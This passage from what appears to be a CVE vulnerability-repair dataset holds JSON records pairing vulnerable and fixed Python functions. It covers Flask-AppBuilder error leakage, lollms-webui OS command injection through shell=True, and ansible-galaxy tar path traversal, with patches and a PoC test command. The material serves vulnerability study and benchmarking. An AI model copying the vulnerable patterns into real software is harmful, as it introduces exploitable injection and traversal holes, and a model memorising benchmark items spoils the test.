        "file_path": "flask_appbuilder/models/sqla/interface.py",
        "start_line": 773,
        "end_line": 796,
        "snippet": "    def delete(self, item: Model, raise_exception: bool = False) -> bool:\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), \"success\")\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), \"warning\")\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False\n        except Exception as e:\n            self.message = (\n                as_unicode(self.general_error_message + \" \" + str(sys.exc_info()[0])),\n                \"danger\",\n            )\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_421_1",
        "commit": "ae25ad4c87a9051ebe4a4e8f02aee73232642626",
        "file_path": "flask_appbuilder/models/sqla/interface.py",
        "start_line": 722,
        "end_line": 741,
        "snippet": "    def add(self, item: Model, raise_exception: bool = False) -> bool:\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), \"success\")\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), \"warning\")\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.database_error_message), \"danger\")\n            log.exception(\"Database error\")\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False"
      },
      {
        "id": "fix_py_421_2",
        "commit": "ae25ad4c87a9051ebe4a4e8f02aee73232642626",
        "file_path": "flask_appbuilder/models/sqla/interface.py",
        "start_line": 743,
        "end_line": 762,
        "snippet": "    def edit(self, item: Model, raise_exception: bool = False) -> bool:\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), \"success\")\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), \"warning\")\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.database_error_message), \"danger\")\n            log.exception(\"Database error\")\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False"
      },
      {
        "id": "fix_py_421_3",
        "commit": "ae25ad4c87a9051ebe4a4e8f02aee73232642626",
        "file_path": "flask_appbuilder/models/sqla/interface.py",
        "start_line": 764,
        "end_line": 784,
        "snippet": "    def delete(self, item: Model, raise_exception: bool = False) -> bool:\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), \"success\")\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), \"warning\")\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.database_error_message), \"danger\")\n            log.exception(\"Database error\")\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False"
      },
      {
        "id": "fix_py_421_4",
        "commit": "ae25ad4c87a9051ebe4a4e8f02aee73232642626",
        "file_path": "flask_appbuilder/models/sqla/interface.py",
        "start_line": 786,
        "end_line": 803,
        "snippet": "    def delete_all(self, items: List[Model]) -> bool:\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), \"success\")\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), \"warning\")\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.database_error_message), \"danger\")\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False"
      }
    ],
    "vul_patch": "--- a/flask_appbuilder/models/sqla/interface.py\n+++ b/flask_appbuilder/models/sqla/interface.py\n@@ -12,11 +12,8 @@\n                 raise e\n             return False\n         except Exception as e:\n-            self.message = (\n-                as_unicode(self.general_error_message + \" \" + str(sys.exc_info()[0])),\n-                \"danger\",\n-            )\n-            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n+            self.message = (as_unicode(self.database_error_message), \"danger\")\n+            log.exception(\"Database error\")\n             self.session.rollback()\n             if raise_exception:\n                 raise e\n\n--- a/flask_appbuilder/models/sqla/interface.py\n+++ b/flask_appbuilder/models/sqla/interface.py\n@@ -12,11 +12,8 @@\n                 raise e\n             return False\n         except Exception as e:\n-            self.message = (\n-                as_unicode(self.general_error_message + \" \" + str(sys.exc_info()[0])),\n-                \"danger\",\n-            )\n-            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n+            self.message = (as_unicode(self.database_error_message), \"danger\")\n+            log.exception(\"Database error\")\n             self.session.rollback()\n             if raise_exception:\n                 raise e\n\n--- a/flask_appbuilder/models/sqla/interface.py\n+++ b/flask_appbuilder/models/sqla/interface.py\n@@ -1,8 +1,7 @@\n-    def delete_all(self, items: List[Model]) -> bool:\n+    def delete(self, item: Model, raise_exception: bool = False) -> bool:\n         try:\n-            for item in items:\n-                self._delete_files(item)\n-                self.session.delete(item)\n+            self._delete_files(item)\n+            self.session.delete(item)\n             self.session.commit()\n             self.message = (as_unicode(self.delete_row_message), \"success\")\n             return True\n@@ -10,12 +9,13 @@\n             self.message = (as_unicode(self.delete_integrity_error_message), \"warning\")\n             log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n             self.session.rollback()\n+            if raise_exception:\n+                raise e\n             return False\n         except Exception as e:\n-            self.message = (\n-                as_unicode(self.general_error_message + \" \" + str(sys.exc_info()[0])),\n-                \"danger\",\n-            )\n-            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n+            self.message = (as_unicode(self.database_error_message), \"danger\")\n+            log.exception(\"Database error\")\n             self.session.rollback()\n+            if raise_exception:\n+                raise e\n             return False\n\n--- a/flask_appbuilder/models/sqla/interface.py\n+++ b/flask_appbuilder/models/sqla/interface.py\n@@ -1,7 +1,8 @@\n-    def delete(self, item: Model, raise_exception: bool = False) -> bool:\n+    def delete_all(self, items: List[Model]) -> bool:\n         try:\n-            self._delete_files(item)\n-            self.session.delete(item)\n+            for item in items:\n+                self._delete_files(item)\n+                self.session.delete(item)\n             self.session.commit()\n             self.message = (as_unicode(self.delete_row_message), \"success\")\n             return True\n@@ -9,16 +10,9 @@\n             self.message = (as_unicode(self.delete_integrity_error_message), \"warning\")\n             log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n             self.session.rollback()\n-            if raise_exception:\n-                raise e\n             return False\n         except Exception as e:\n-            self.message = (\n-                as_unicode(self.general_error_message + \" \" + str(sys.exc_info()[0])),\n-                \"danger\",\n-            )\n+            self.message = (as_unicode(self.database_error_message), \"danger\")\n             log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n             self.session.rollback()\n-            if raise_exception:\n-                raise e\n             return False\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-1520",
    "cve_description": "An OS Command Injection vulnerability exists in the '/open_code_folder' endpoint of the parisneo/lollms-webui application, due to improper validation of user-supplied input in the 'discussion_id' parameter. Attackers can exploit this vulnerability by injecting malicious OS commands, leading to unauthorized command execution on the underlying operating system. This could result in unauthorized access, data leakage, or complete system compromise.",
    "cwe_info": {
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/parisneo/lollms-webui",
    "patch_url": [
      "https://github.com/parisneo/lollms-webui/commit/2497d1a4fe5a09f003bf7a9bc426139e9295a934"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_188_1",
        "commit": "3a1f3da",
        "file_path": "endpoints/lollms_advanced.py",
        "start_line": 186,
        "end_line": 211,
        "snippet": "async def open_file(file_path: FilePath):\n    \"\"\"\n    Opens code in vs code.\n\n    :param file_path: The file path object.\n    :return: A JSON response with the status of the operation.\n    \"\"\"\n\n    try:\n        # Validate the 'path' parameter\n        path = file_path.path\n        if not validate_file_path(path):\n            return {\"status\":False,\"error\":\"Invalid file path\"}\n        \n        # Sanitize the 'path' parameter\n        path = os.path.realpath(path)\n        \n        # Use subprocess.Popen to safely open the file\n        subprocess.Popen([\"start\", path], shell=True)\n        \n        return {\"status\": True, \"execution_time\": 0}\n    \n    except Exception as ex:\n        trace_exception(ex)\n        lollmsElfServer.error(ex)\n        return {\"status\":False,\"error\":str(ex)}"
      },
      {
        "id": "vul_py_188_2",
        "commit": "3a1f3da",
        "file_path": "endpoints/lollms_advanced.py",
        "start_line": 219,
        "end_line": 247,
        "snippet": "async def open_code_in_vs_code(vs_code_data: VSCodeData):\n    \"\"\"\n    Opens code in vs code.\n\n    :param vs_code_data: The data object.\n    :return: A JSON response with the status of the operation.\n    \"\"\"\n\n    try:\n        discussion_id = vs_code_data.discussion_id\n        message_id = vs_code_data.message_id\n        code = vs_code_data.code\n\n        ASCIIColors.info(\"Opening folder:\")\n        # Create a temporary file.\n        root_folder = Path(os.path.realpath(lollmsElfServer.lollms_paths.personal_outputs_path/\"discussions\"/f\"d_{discussion_id}\"/f\"{message_id}.py\"))\n        root_folder.mkdir(parents=True,exist_ok=True)\n        tmp_file = root_folder/f\"ai_code_{message_id}.py\"\n        with open(tmp_file,\"w\") as f:\n            f.write(code)\n        \n        # Use subprocess.Popen to safely open the file\n        subprocess.Popen([\"code\", str(root_folder)], shell=True)\n        \n        return {\"status\": True, \"execution_time\": 0}\n    except Exception as ex:\n        trace_exception(ex)\n        lollmsElfServer.error(ex)\n        return {\"status\":False,\"error\":str(ex)}"
      },
      {
        "id": "vul_py_188_3",
        "commit": "3a1f3da",
        "file_path": "endpoints/lollms_advanced.py",
        "start_line": 254,
        "end_line": 300,
        "snippet": "async def open_code_folder(request: FolderRequest):\n    \"\"\"\n    Opens code folder.\n\n    :param request: The HTTP request object.\n    :return: A JSON response with the status of the operation.\n    \"\"\"\n    \n    try:\n        if request.discussion_id:\n            discussion_id = request.discussion_id\n\n            ASCIIColors.info(\"Opening folder:\")\n            # Create a temporary file.\n            root_folder = lollmsElfServer.lollms_paths.personal_outputs_path / \"discussions\" / f\"d_{discussion_id}\"\n            root_folder.mkdir(parents=True, exist_ok=True)\n            if platform.system() == 'Windows':\n                subprocess.run(['start', str(root_folder)], check=True, shell=True)\n            elif platform.system() == 'Linux':\n                subprocess.run(['xdg-open', str(root_folder)], check=True)\n            elif platform.system() == 'Darwin':\n                subprocess.run(['open', str(root_folder)], check=True)\n            return {\"status\": True, \"execution_time\": 0}\n        elif request.folder_path:\n            folder_path = os.path.realpath(request.folder_path)\n            # Verify that this is a file and not an executable\n            root_folder = Path(folder_path)\n            is_valid_folder_path = root_folder.is_dir()\n\n            if not is_valid_folder_path:\n                return {\"status\":False, \"error\":\"Invalid folder path\"}\n\n            ASCIIColors.info(\"Opening folder:\")\n            # Create a temporary file.\n            root_folder.mkdir(parents=True, exist_ok=True)\n            if platform.system() == 'Windows':\n                subprocess.run(['start', str(root_folder)], check=True, shell=True)\n            elif platform.system() == 'Linux':\n                subprocess.run(['xdg-open', str(root_folder)], check=True)\n            elif platform.system() == 'Darwin':\n                subprocess.run(['open', str(root_folder)], check=True)\n            return {\"status\": True, \"execution_time\": 0}\n\n    except Exception as ex:\n        trace_exception(ex)\n        lollmsElfServer.error(ex)\n        return {\"status\": False, \"error\": \"An error occurred while processing the request\"}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_188_1",
        "commit": "2497d1a",
        "file_path": "endpoints/lollms_advanced.py",
        "start_line": 186,
        "end_line": 211,
        "snippet": "async def open_file(file_path: FilePath):\n    \"\"\"\n    Opens code in vs code.\n\n    :param file_path: The file path object.\n    :return: A JSON response with the status of the operation.\n    \"\"\"\n\n    try:\n        # Validate the 'path' parameter\n        path = file_path.path\n        if not validate_file_path(path):\n            return {\"status\":False,\"error\":\"Invalid file path\"}\n        \n        # Sanitize the 'path' parameter\n        path = os.path.realpath(path)\n        \n        # Use subprocess.Popen to safely open the file\n        subprocess.Popen([\"start\", path])\n        \n        return {\"status\": True, \"execution_time\": 0}\n    \n    except Exception as ex:\n        trace_exception(ex)\n        lollmsElfServer.error(ex)\n        return {\"status\":False,\"error\":str(ex)}"
      },
      {
        "id": "fix_py_188_2",
        "commit": "2497d1a",
        "file_path": "endpoints/lollms_advanced.py",
        "start_line": 219,
        "end_line": 247,
        "snippet": "async def open_code_in_vs_code(vs_code_data: VSCodeData):\n    \"\"\"\n    Opens code in vs code.\n\n    :param vs_code_data: The data object.\n    :return: A JSON response with the status of the operation.\n    \"\"\"\n\n    try:\n        discussion_id = vs_code_data.discussion_id\n        message_id = vs_code_data.message_id\n        code = vs_code_data.code\n\n        ASCIIColors.info(\"Opening folder:\")\n        # Create a temporary file.\n        root_folder = Path(os.path.realpath(lollmsElfServer.lollms_paths.personal_outputs_path/\"discussions\"/f\"d_{discussion_id}\"/f\"{message_id}.py\"))\n        root_folder.mkdir(parents=True,exist_ok=True)\n        tmp_file = root_folder/f\"ai_code_{message_id}.py\"\n        with open(tmp_file,\"w\") as f:\n            f.write(code)\n        \n        # Use subprocess.Popen to safely open the file\n        subprocess.Popen([\"code\", str(root_folder)])\n        \n        return {\"status\": True, \"execution_time\": 0}\n    except Exception as ex:\n        trace_exception(ex)\n        lollmsElfServer.error(ex)\n        return {\"status\":False,\"error\":str(ex)}"
      },
      {
        "id": "fix_py_188_3",
        "commit": "2497d1a",
        "file_path": "endpoints/lollms_advanced.py",
        "start_line": 254,
        "end_line": 300,
        "snippet": "async def open_code_folder(request: FolderRequest):\n    \"\"\"\n    Opens code folder.\n\n    :param request: The HTTP request object.\n    :return: A JSON response with the status of the operation.\n    \"\"\"\n    \n    try:\n        if request.discussion_id:\n            discussion_id = request.discussion_id\n\n            ASCIIColors.info(\"Opening folder:\")\n            # Create a temporary file.\n            root_folder = lollmsElfServer.lollms_paths.personal_outputs_path / \"discussions\" / f\"d_{discussion_id}\"\n            root_folder.mkdir(parents=True, exist_ok=True)\n            if platform.system() == 'Windows':\n                subprocess.run(['start', str(root_folder)], check=True)\n            elif platform.system() == 'Linux':\n                subprocess.run(['xdg-open', str(root_folder)], check=True)\n            elif platform.system() == 'Darwin':\n                subprocess.run(['open', str(root_folder)], check=True)\n            return {\"status\": True, \"execution_time\": 0}\n        elif request.folder_path:\n            folder_path = os.path.realpath(request.folder_path)\n            # Verify that this is a file and not an executable\n            root_folder = Path(folder_path)\n            is_valid_folder_path = root_folder.is_dir()\n\n            if not is_valid_folder_path:\n                return {\"status\":False, \"error\":\"Invalid folder path\"}\n\n            ASCIIColors.info(\"Opening folder:\")\n            # Create a temporary file.\n            root_folder.mkdir(parents=True, exist_ok=True)\n            if platform.system() == 'Windows':\n                subprocess.run(['start', str(root_folder)], check=True)\n            elif platform.system() == 'Linux':\n                subprocess.run(['xdg-open', str(root_folder)], check=True)\n            elif platform.system() == 'Darwin':\n                subprocess.run(['open', str(root_folder)], check=True)\n            return {\"status\": True, \"execution_time\": 0}\n\n    except Exception as ex:\n        trace_exception(ex)\n        lollmsElfServer.error(ex)\n        return {\"status\": False, \"error\": \"An error occurred while processing the request\"}"
      }
    ],
    "vul_patch": "--- a/endpoints/lollms_advanced.py\n+++ b/endpoints/lollms_advanced.py\n@@ -16,7 +16,7 @@\n         path = os.path.realpath(path)\n         \n         # Use subprocess.Popen to safely open the file\n-        subprocess.Popen([\"start\", path], shell=True)\n+        subprocess.Popen([\"start\", path])\n         \n         return {\"status\": True, \"execution_time\": 0}\n     \n\n--- a/endpoints/lollms_advanced.py\n+++ b/endpoints/lollms_advanced.py\n@@ -20,7 +20,7 @@\n             f.write(code)\n         \n         # Use subprocess.Popen to safely open the file\n-        subprocess.Popen([\"code\", str(root_folder)], shell=True)\n+        subprocess.Popen([\"code\", str(root_folder)])\n         \n         return {\"status\": True, \"execution_time\": 0}\n     except Exception as ex:\n\n--- a/endpoints/lollms_advanced.py\n+++ b/endpoints/lollms_advanced.py\n@@ -15,7 +15,7 @@\n             root_folder = lollmsElfServer.lollms_paths.personal_outputs_path / \"discussions\" / f\"d_{discussion_id}\"\n             root_folder.mkdir(parents=True, exist_ok=True)\n             if platform.system() == 'Windows':\n-                subprocess.run(['start', str(root_folder)], check=True, shell=True)\n+                subprocess.run(['start', str(root_folder)], check=True)\n             elif platform.system() == 'Linux':\n                 subprocess.run(['xdg-open', str(root_folder)], check=True)\n             elif platform.system() == 'Darwin':\n@@ -34,7 +34,7 @@\n             # Create a temporary file.\n             root_folder.mkdir(parents=True, exist_ok=True)\n             if platform.system() == 'Windows':\n-                subprocess.run(['start', str(root_folder)], check=True, shell=True)\n+                subprocess.run(['start', str(root_folder)], check=True)\n             elif platform.system() == 'Linux':\n                 subprocess.run(['xdg-open', str(root_folder)], check=True)\n             elif platform.system() == 'Darwin':\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-10691",
    "cve_description": "An archive traversal flaw was found in all ansible-engine versions 2.9.x prior to 2.9.7, when running ansible-galaxy collection install. When extracting a collection .tar.gz file, the directory is created without sanitizing the filename. An attacker could take advantage to overwrite any file within the system.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/ansible/ansible",
    "patch_url": [
      "https://github.com/ansible/ansible/commit/b2551bb6943eec078066aa3a923e0bb3ed85abe8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_25_1",
        "commit": "cef6296",
        "file_path": "lib/ansible/galaxy/collection.py",
        "start_line": 148,
        "end_line": 188,
        "snippet": "    def install(self, path, b_temp_path):\n        if self.skip:\n            display.display(\"Skipping '%s' as it is already installed\" % to_text(self))\n            return\n\n        # Install if it is not\n        collection_path = os.path.join(path, self.namespace, self.name)\n        b_collection_path = to_bytes(collection_path, errors='surrogate_or_strict')\n        display.display(\"Installing '%s:%s' to '%s'\" % (to_text(self), self.latest_version, collection_path))\n\n        if self.b_path is None:\n            download_url = self._metadata.download_url\n            artifact_hash = self._metadata.artifact_sha256\n            headers = {}\n            self.api._add_auth_token(headers, download_url, required=False)\n\n            self.b_path = _download_file(download_url, b_temp_path, artifact_hash, self.api.validate_certs,\n                                         headers=headers)\n\n        if os.path.exists(b_collection_path):\n            shutil.rmtree(b_collection_path)\n        os.makedirs(b_collection_path)\n\n        with tarfile.open(self.b_path, mode='r') as collection_tar:\n            files_member_obj = collection_tar.getmember('FILES.json')\n            with _tarfile_extract(collection_tar, files_member_obj) as files_obj:\n                files = json.loads(to_text(files_obj.read(), errors='surrogate_or_strict'))\n\n            _extract_tar_file(collection_tar, 'MANIFEST.json', b_collection_path, b_temp_path)\n            _extract_tar_file(collection_tar, 'FILES.json', b_collection_path, b_temp_path)\n\n            for file_info in files['files']:\n                file_name = file_info['name']\n                if file_name == '.':\n                    continue\n\n                if file_info['ftype'] == 'file':\n                    _extract_tar_file(collection_tar, file_name, b_collection_path, b_temp_path,\n                                      expected_hash=file_info['chksum_sha256'])\n                else:\n                    os.makedirs(os.path.join(b_collection_path, to_bytes(file_name, errors='surrogate_or_strict')))"
      },
      {
        "id": "vul_py_25_2",
        "commit": "cef6296",
        "file_path": "lib/ansible/galaxy/collection.py",
        "start_line": 903,
        "end_line": 942,
        "snippet": "def _extract_tar_file(tar, filename, b_dest, b_temp_path, expected_hash=None):\n    n_filename = to_native(filename, errors='surrogate_or_strict')\n    try:\n        member = tar.getmember(n_filename)\n    except KeyError:\n        raise AnsibleError(\"Collection tar at '%s' does not contain the expected file '%s'.\" % (to_native(tar.name),\n                                                                                                n_filename))\n\n    with tempfile.NamedTemporaryFile(dir=b_temp_path, delete=False) as tmpfile_obj:\n        bufsize = 65536\n        sha256_digest = sha256()\n        with _tarfile_extract(tar, member) as tar_obj:\n            data = tar_obj.read(bufsize)\n            while data:\n                tmpfile_obj.write(data)\n                tmpfile_obj.flush()\n                sha256_digest.update(data)\n                data = tar_obj.read(bufsize)\n\n        actual_hash = sha256_digest.hexdigest()\n\n        if expected_hash and actual_hash != expected_hash:\n            raise AnsibleError(\"Checksum mismatch for '%s' inside collection at '%s'\"\n                               % (n_filename, to_native(tar.name)))\n\n        b_dest_filepath = os.path.join(b_dest, to_bytes(filename, errors='surrogate_or_strict'))\n        b_parent_dir = os.path.split(b_dest_filepath)[0]\n        if not os.path.exists(b_parent_dir):\n            # Seems like Galaxy does not validate if all file entries have a corresponding dir ftype entry. This check\n            # makes sure we create the parent directory even if it wasn't set in the metadata.\n            os.makedirs(b_parent_dir, mode=0o0755)\n\n        shutil.move(to_bytes(tmpfile_obj.name, errors='surrogate_or_strict'), b_dest_filepath)\n\n        # Default to rw-r--r-- and only add execute if the tar file has execute.\n        new_mode = 0o644\n        if stat.S_IMODE(member.mode) & stat.S_IXUSR:\n            new_mode |= 0o0111\n\n        os.chmod(b_dest_filepath, new_mode)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_25_1",
        "commit": "b2551bb6943eec078066aa3a923e0bb3ed85abe8",
        "file_path": "lib/ansible/galaxy/collection.py",
        "start_line": 148,
        "end_line": 198,
        "snippet": "    def install(self, path, b_temp_path):\n        if self.skip:\n            display.display(\"Skipping '%s' as it is already installed\" % to_text(self))\n            return\n\n        # Install if it is not\n        collection_path = os.path.join(path, self.namespace, self.name)\n        b_collection_path = to_bytes(collection_path, errors='surrogate_or_strict')\n        display.display(\"Installing '%s:%s' to '%s'\" % (to_text(self), self.latest_version, collection_path))\n\n        if self.b_path is None:\n            download_url = self._metadata.download_url\n            artifact_hash = self._metadata.artifact_sha256\n            headers = {}\n            self.api._add_auth_token(headers, download_url, required=False)\n\n            self.b_path = _download_file(download_url, b_temp_path, artifact_hash, self.api.validate_certs,\n                                         headers=headers)\n\n        if os.path.exists(b_collection_path):\n            shutil.rmtree(b_collection_path)\n        os.makedirs(b_collection_path)\n\n        try:\n            with tarfile.open(self.b_path, mode='r') as collection_tar:\n                files_member_obj = collection_tar.getmember('FILES.json')\n                with _tarfile_extract(collection_tar, files_member_obj) as files_obj:\n                    files = json.loads(to_text(files_obj.read(), errors='surrogate_or_strict'))\n\n                _extract_tar_file(collection_tar, 'MANIFEST.json', b_collection_path, b_temp_path)\n                _extract_tar_file(collection_tar, 'FILES.json', b_collection_path, b_temp_path)\n\n                for file_info in files['files']:\n                    file_name = file_info['name']\n                    if file_name == '.':\n                        continue\n\n                    if file_info['ftype'] == 'file':\n                        _extract_tar_file(collection_tar, file_name, b_collection_path, b_temp_path,\n                                          expected_hash=file_info['chksum_sha256'])\n                    else:\n                        os.makedirs(os.path.join(b_collection_path, to_bytes(file_name, errors='surrogate_or_strict')))\n        except Exception:\n            # Ensure we don't leave the dir behind in case of a failure.\n            shutil.rmtree(b_collection_path)\n\n            b_namespace_path = os.path.dirname(b_collection_path)\n            if not os.listdir(b_namespace_path):\n                os.rmdir(b_namespace_path)\n\n            raise"
      },
      {
        "id": "fix_py_25_2",
        "commit": "b2551bb6943eec078066aa3a923e0bb3ed85abe8",
        "file_path": "lib/ansible/galaxy/collection.py",
        "start_line": 913,
        "end_line": 956,
        "snippet": "def _extract_tar_file(tar, filename, b_dest, b_temp_path, expected_hash=None):\n    n_filename = to_native(filename, errors='surrogate_or_strict')\n    try:\n        member = tar.getmember(n_filename)\n    except KeyError:\n        raise AnsibleError(\"Collection tar at '%s' does not contain the expected file '%s'.\" % (to_native(tar.name),\n                                                                                                n_filename))\n\n    with tempfile.NamedTemporaryFile(dir=b_temp_path, delete=False) as tmpfile_obj:\n        bufsize = 65536\n        sha256_digest = sha256()\n        with _tarfile_extract(tar, member) as tar_obj:\n            data = tar_obj.read(bufsize)\n            while data:\n                tmpfile_obj.write(data)\n                tmpfile_obj.flush()\n                sha256_digest.update(data)\n                data = tar_obj.read(bufsize)\n\n        actual_hash = sha256_digest.hexdigest()\n\n        if expected_hash and actual_hash != expected_hash:\n            raise AnsibleError(\"Checksum mismatch for '%s' inside collection at '%s'\"\n                               % (n_filename, to_native(tar.name)))\n\n        b_dest_filepath = os.path.abspath(os.path.join(b_dest, to_bytes(filename, errors='surrogate_or_strict')))\n        b_parent_dir = os.path.dirname(b_dest_filepath)\n        if b_parent_dir != b_dest and not b_parent_dir.startswith(b_dest + to_bytes(os.path.sep)):\n            raise AnsibleError(\"Cannot extract tar entry '%s' as it will be placed outside the collection directory\"\n                               % to_native(filename, errors='surrogate_or_strict'))\n\n        if not os.path.exists(b_parent_dir):\n            # Seems like Galaxy does not validate if all file entries have a corresponding dir ftype entry. This check\n            # makes sure we create the parent directory even if it wasn't set in the metadata.\n            os.makedirs(b_parent_dir, mode=0o0755)\n\n        shutil.move(to_bytes(tmpfile_obj.name, errors='surrogate_or_strict'), b_dest_filepath)\n\n        # Default to rw-r--r-- and only add execute if the tar file has execute.\n        new_mode = 0o644\n        if stat.S_IMODE(member.mode) & stat.S_IXUSR:\n            new_mode |= 0o0111\n\n        os.chmod(b_dest_filepath, new_mode)"
      }
    ],
    "vul_patch": "--- a/lib/ansible/galaxy/collection.py\n+++ b/lib/ansible/galaxy/collection.py\n@@ -21,21 +21,31 @@\n             shutil.rmtree(b_collection_path)\n         os.makedirs(b_collection_path)\n \n-        with tarfile.open(self.b_path, mode='r') as collection_tar:\n-            files_member_obj = collection_tar.getmember('FILES.json')\n-            with _tarfile_extract(collection_tar, files_member_obj) as files_obj:\n-                files = json.loads(to_text(files_obj.read(), errors='surrogate_or_strict'))\n+        try:\n+            with tarfile.open(self.b_path, mode='r') as collection_tar:\n+                files_member_obj = collection_tar.getmember('FILES.json')\n+                with _tarfile_extract(collection_tar, files_member_obj) as files_obj:\n+                    files = json.loads(to_text(files_obj.read(), errors='surrogate_or_strict'))\n \n-            _extract_tar_file(collection_tar, 'MANIFEST.json', b_collection_path, b_temp_path)\n-            _extract_tar_file(collection_tar, 'FILES.json', b_collection_path, b_temp_path)\n+                _extract_tar_file(collection_tar, 'MANIFEST.json', b_collection_path, b_temp_path)\n+                _extract_tar_file(collection_tar, 'FILES.json', b_collection_path, b_temp_path)\n \n-            for file_info in files['files']:\n-                file_name = file_info['name']\n-                if file_name == '.':\n-                    continue\n+                for file_info in files['files']:\n+                    file_name = file_info['name']\n+                    if file_name == '.':\n+                        continue\n \n-                if file_info['ftype'] == 'file':\n-                    _extract_tar_file(collection_tar, file_name, b_collection_path, b_temp_path,\n-                                      expected_hash=file_info['chksum_sha256'])\n-                else:\n-                    os.makedirs(os.path.join(b_collection_path, to_bytes(file_name, errors='surrogate_or_strict')))\n+                    if file_info['ftype'] == 'file':\n+                        _extract_tar_file(collection_tar, file_name, b_collection_path, b_temp_path,\n+                                          expected_hash=file_info['chksum_sha256'])\n+                    else:\n+                        os.makedirs(os.path.join(b_collection_path, to_bytes(file_name, errors='surrogate_or_strict')))\n+        except Exception:\n+            # Ensure we don't leave the dir behind in case of a failure.\n+            shutil.rmtree(b_collection_path)\n+\n+            b_namespace_path = os.path.dirname(b_collection_path)\n+            if not os.listdir(b_namespace_path):\n+                os.rmdir(b_namespace_path)\n+\n+            raise\n\n--- a/lib/ansible/galaxy/collection.py\n+++ b/lib/ansible/galaxy/collection.py\n@@ -23,8 +23,12 @@\n             raise AnsibleError(\"Checksum mismatch for '%s' inside collection at '%s'\"\n                                % (n_filename, to_native(tar.name)))\n \n-        b_dest_filepath = os.path.join(b_dest, to_bytes(filename, errors='surrogate_or_strict'))\n-        b_parent_dir = os.path.split(b_dest_filepath)[0]\n+        b_dest_filepath = os.path.abspath(os.path.join(b_dest, to_bytes(filename, errors='surrogate_or_strict')))\n+        b_parent_dir = os.path.dirname(b_dest_filepath)\n+        if b_parent_dir != b_dest and not b_parent_dir.startswith(b_dest + to_bytes(os.path.sep)):\n+            raise AnsibleError(\"Cannot extract tar entry '%s' as it will be placed outside the collection directory\"\n+                               % to_native(filename, errors='surrogate_or_strict'))\n+\n         if not os.path.exists(b_parent_dir):\n             # Seems like Galaxy does not validate if all file entries have a corresponding dir ftype entry. This check\n             # makes sure we create the parent directory even if it wasn't set in the metadata.\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2020-10691:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/ansible\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2020-10691/bin/ansible-test integration ansible-galaxy-collection --python 3.8 --tags \"bad_tarball\" --allow-disabled && /workspace/PoC_env/CVE-2020-10691/bin/pytest test/units/galaxy/test_collection.py::test_extract_tar_file_outside_dir",
